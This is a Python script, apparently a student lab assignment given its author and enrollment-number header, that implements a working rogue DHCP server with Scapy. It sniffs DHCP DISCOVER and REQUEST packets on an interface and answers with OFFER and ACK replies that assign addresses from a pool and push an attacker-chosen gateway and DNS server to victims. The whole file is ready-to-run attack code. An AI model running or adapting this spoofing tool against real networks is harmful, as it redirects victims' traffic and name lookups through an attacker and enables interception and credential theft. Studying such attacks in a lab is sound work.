#!/usr/bin/env python3
"""
==============================================================
  DHCP Spoofing — Rogue DHCP Server
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_DHCP_Spoofing_P1.py
==============================================================
"""

import argparse
import os
import sys
import ipaddress
import socket
import struct
import fcntl
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp, get_if_hwaddr, conf

ip_pool = []
leases  = {}

def build_pool(start, end):
    s = int(ipaddress.IPv4Address(start))
    e = int(ipaddress.IPv4Address(end))
    return [str(ipaddress.IPv4Address(i)) for i in range(s, e + 1)]

def next_ip(client_mac):
    if client_mac in leases:
        return leases[client_mac]
    for ip in ip_pool:
        if ip not in leases.values():
            leases[client_mac] = ip
            return ip
    return None

def get_iface_ip(iface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(), 0x8915,
            struct.pack('256s', iface[:15].encode())
        )[20:24])
    except Exception:
        return "0.0.0.0"

def send_reply(pkt, iface, offered_ip, gateway, dns, subnet, server_ip, msg_type):
    reply = (
        Ether(src=get_if_hwaddr(iface), dst=pkt[Ether].src) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip,
              chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
        DHCP(options=[
            ("message-type", msg_type),
            ("server_id",    server_ip),
            ("lease_time",   86400),
            ("subnet_mask",  subnet),
            ("router",       gateway),
            ("name_server",  dns),
            "end"
        ])
    )
    sendp(reply, iface=iface, verbose=False)

def handle_dhcp(pkt, iface, gateway, dns, subnet, server_ip):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return
    opts = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    msg  = opts.get("message-type", 0)
    mac  = pkt[Ether].src
    if msg == 1:
        ip = next_ip(mac)
        if not ip:
            print("[!] Pool agotado.")
            return
        print(f"[+] DISCOVER {mac} → ofreciendo {ip}")
        send_reply(pkt, iface, ip, gateway, dns, subnet, server_ip, "offer")
    elif msg == 3:
        ip = leases.get(mac)
        if not ip:
            return
        print(f"[+] REQUEST  {mac} → ACK {ip}")
        send_reply(pkt, iface, ip, gateway, dns, subnet, server_ip, "ack")

def attack(iface, start, end, gateway, dns, subnet):
    global ip_pool
    ip_pool   = build_pool(start, end)
    server_ip = get_iface_ip(iface)
    print("\n[*] DHCP Spoofing — Ashley Fabian (2025-0773)")
    print(f"[*] Pool: {start} – {end} | GW: {gateway} | DNS: {dns}\n")
    conf.verb = 0
    sniff(iface=iface, filter="udp and (port 67 or port 68)",
          prn=lambda p: handle_dhcp(p, iface, gateway, dns, subnet, server_ip),
          store=False)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface",   required=True)
    parser.add_argument("-s", "--start",   required=True)
    parser.add_argument("-e", "--end",     required=True)
    parser.add_argument("-g", "--gateway", required=True)
    parser.add_argument("-n", "--dns",     required=True)
    parser.add_argument("-m", "--mask",    default="255.255.255.0")
    args = parser.parse_args()
    attack(args.iface, args.start, args.end, args.gateway, args.dns, args.mask)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)
    main()
